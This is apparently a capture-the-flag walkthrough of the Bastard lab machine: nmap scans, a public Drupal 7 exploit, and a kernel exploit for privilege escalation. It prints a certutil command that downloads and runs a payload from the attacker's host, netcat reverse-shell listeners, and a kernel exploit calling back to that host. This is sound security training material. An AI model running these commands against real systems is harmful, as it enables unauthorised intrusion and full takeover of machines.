**Ping**
```
ping 10.10.10.9
```
![[Pasted image 20240615131109.png]]

Nmap default Scan
```
nmap 10.10.10.9 -oN dnmap
```
![[Pasted image 20240615131415.png]]

Nmap Script and Service Scan
```
nmap 10.10.10.9 -sVC -oN snmap
```
![[Pasted image 20240615131548.png]]

Nmap all port Scan
```
 nmap -p- --min-rate 10000 10.10.10.9 -oN anmap
```
![[Pasted image 20240615131512.png]]

On port 80
![[Pasted image 20240615145329.png]]

 Got the version of drupal in source code
 ![[Pasted image 20240615145507.png]]

Also we can see this in CHANGELOG.txt
![[Pasted image 20240615145659.png]]


Will move to Initial Foothold....!

Will search Public exploit for Drupal 7
![[Pasted image 20240615152249.png]]
Got one https://www.exploit-db.com/exploits/41564

Will run the exploit
```
python3 exp.py http://10.10.10.9/ -c 'certutil -urlcache -f http://10.10.14.2/met.exe c:/windows/temp/met.exe'
```
![[Pasted image 20240615152345.png]]

```
python3 exp.py http://10.10.10.9/ -c 'C:/Windows/Temp/met.exe'
```
![[Pasted image 20240615152423.png]]
Will trigger the payload

```
rlwrap nc -nvlp 443
```
![[Pasted image 20240615152520.png]]

Will move to Privilege escalation.....!

Will check Our Privileges
```
whoami /priv
```
![[Pasted image 20240615152856.png]]

Get System info
```
systeminfo
```
![[Pasted image 20240615152804.png]]

Though We have Impersonate Privilege, we can't use printspoofer or godpotato.
So Will go with kernel Exploit

Found exploit in this link:https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe

Will transfer the binary to target Machine and run the exploit
```
exp.exe 10.10.14.2 4444
```
![[Pasted image 20240615153223.png]]

```
rlwrap nc -nvlp 4444
```
![[Pasted image 20240615153145.png]]
Cooool….! We got Elevated. 

Got user.txt in User dimitris's Desktop
![[Pasted image 20240615152633.png]]

Got root.txt in Admin's Desktop
![[Pasted image 20240615153414.png]]


I'm done with Bastard...…:) 